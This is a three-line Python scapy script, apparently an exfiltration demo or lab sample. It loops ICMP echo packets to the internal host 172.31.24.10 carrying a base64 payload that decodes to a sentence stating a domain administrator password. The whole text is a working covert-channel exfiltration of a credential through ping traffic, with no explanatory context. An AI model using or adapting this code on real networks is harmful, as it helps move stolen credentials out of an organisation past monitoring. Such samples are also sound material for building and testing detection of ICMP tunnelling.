from scapy.all import IP, ICMP, send, srloop
pingit = IP(dst="172.31.24.10")/ICMP()/"VGhpcyBpcyB0aGUgZG9tYWluIGFkbWluIHBhc3N3b3JkOiBnczJKODJ5dVVrc24xMkQ=="
response = srloop(pingit)
